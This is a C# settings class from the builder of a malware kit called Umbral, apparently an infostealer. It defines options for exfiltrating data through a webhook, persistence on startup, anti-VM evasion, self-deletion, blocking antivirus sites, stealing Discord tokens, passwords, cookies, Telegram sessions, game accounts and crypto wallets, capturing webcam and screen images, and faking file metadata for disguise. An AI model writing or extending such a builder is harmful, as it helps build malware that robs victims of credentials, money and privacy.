using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Umbral.builder.Components.Utilities;

namespace Umbral.builder
{
    internal static class Settings
    {

        // General Settings
        internal static string Webhook { get; set; }
        internal static string Version { get; private set; }
        internal static string Mutex { get; private set; }
        internal static bool Ping { get; set; }
        internal static bool Startup { get; set; }
        internal static bool AntiVm { get; set; }
        internal static bool Melt { get; set; }
        internal static bool BlockAvSites { get; set; }

        internal static bool StealDiscordTokens { get; set; }
        internal static bool StealPasswords { get; set; }
        internal static bool StealCookies { get; set; }
        internal static bool StealGames { get; set; }
        internal static bool StealTelegramSessions { get; set; }
        internal static bool StealSystemInfo { get; set; }
        internal static bool StealWallets { get; set; }

        internal static bool TakeWebcamSnapshot { get; set; }
        internal static bool TakeScreenshot { get; set; }

        // Icon
        internal static string IconPath { get; set; }

        // Assembly
        internal static string CompanyName { get; set; }
        internal static string FileDescription { get; set; }
        internal static string ProductName { get; set; }
        internal static string LegalCopyright { get; set; }
        internal static string LegalTrademarks { get; set; }
        internal static string InternalName { get; set; }
        internal static string OriginalFilename { get; set; }


        static Settings()
        {
            Version = "v1.3";
            Mutex = Common.GenerateRandomString(20);
        }
    }
}
